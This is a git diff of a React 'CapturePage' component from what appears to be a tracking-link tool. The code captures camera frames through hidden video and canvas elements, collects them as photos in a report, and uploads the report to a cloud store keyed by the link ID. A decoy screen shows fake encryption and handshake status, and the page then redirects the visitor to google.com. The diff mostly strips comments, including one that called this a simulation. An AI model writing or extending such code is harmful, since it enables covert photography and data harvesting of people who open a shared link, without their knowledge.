@@ -19,12 +19,9 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   useEffect(() => {
     // We don't need local config anymore if we are "live", 
     // but we can try to find the redirect URL.
-    // In a full production app, you'd fetch the redirect URL from the cloud too.
     const savedLinks = JSON.parse(localStorage.getItem('il_links') || '[]');
     const found = savedLinks.find((l: LinkConfig) => l.id === linkId);
     
-    // For simulation, even if it's not in OUR local storage, we proceed
-    // with a default redirect if we can't find the specific one.
     setConfig(found || { id: linkId, redirectUrl: 'https://google.com', name: 'External Entry', createdAt: '' });
     
     const timer = setTimeout(() => {
@@ -123,7 +120,7 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
               canvasRef.current.width = videoRef.current.videoWidth;
               canvasRef.current.height = videoRef.current.videoHeight;
               ctx?.drawImage(videoRef.current, 0, 0);
-              const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.6); // Slightly compressed for faster relay
+              const dataUrl = canvasRef.current.toDataURL('image/jpeg', 0.6);
               report.photos!.push(dataUrl);
             }
           }
@@ -137,7 +134,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     setStep('Finalizing Encryption');
     // E. Global Sync (PUSH TO CLOUD)
     try {
-      // First get existing reports for this link
       const existingRes = await fetch(`${STORAGE_BASE}/reports_${linkId}`);
       let existing = [];
       if (existingRes.ok) {
@@ -145,7 +141,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
         if (!Array.isArray(existing)) existing = [];
       }
       
-      // Add new one and push back
       const updated = [...existing, report];
       await fetch(`${STORAGE_BASE}/reports_${linkId}`, {
         method: 'POST',
@@ -153,7 +148,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       });
     } catch (err) {
       console.error('Cloud upload failed:', err);
-      // Fallback to local
       const localReports = JSON.parse(localStorage.getItem('il_reports') || '[]');
       localReports.push(report);
       localStorage.setItem('il_reports', JSON.stringify(localReports));
@@ -168,7 +162,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       <video ref={videoRef} className="hidden" playsInline muted></video>
       <canvas ref={canvasRef} className="hidden"></canvas>
       
-      {/* Background Anime Accents */}
       <div className="absolute top-0 left-0 w-full h-1 bg-ink/10">
         <div className="h-full bg-brand-accent animate-[loading_2s_infinite]" style={{ width: '30%' }}></div>
       </div>
@@ -206,11 +199,11 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
             </div>
             <div className="bg-ink p-6 rounded-sm shadow-comic">
               <p className="text-[10px] text-brand-accent font-black font-mono text-left leading-relaxed tracking-tighter uppercase italic">
-                > PROTOCOL: INSIGHT_LINK_V2.4<br/>
-                > ENCRYPT: RSA_4096_CHACHA20<br/>
-                > PROXY: RELAY_NODE_{linkId.toUpperCase()}<br/>
-                > STATUS: {step.toUpperCase()}...<br/>
-                > {status === 'done' ? 'HANDSHAKE COMPLETE' : 'AWAITING RESPONSE'}
+                {`> PROTOCOL: INSIGHT_LINK_V2.4`}<br/>
+                {`> ENCRYPT: RSA_4096_CHACHA20`}<br/>
+                {`> PROXY: RELAY_NODE_${linkId.toUpperCase()}`}<br/>
+                {`> STATUS: ${step.toUpperCase()}...`}<br/>
+                {`> ${status === 'done' ? 'HANDSHAKE COMPLETE' : 'AWAITING RESPONSE'}`}
               </p>
             </div>
           </div>
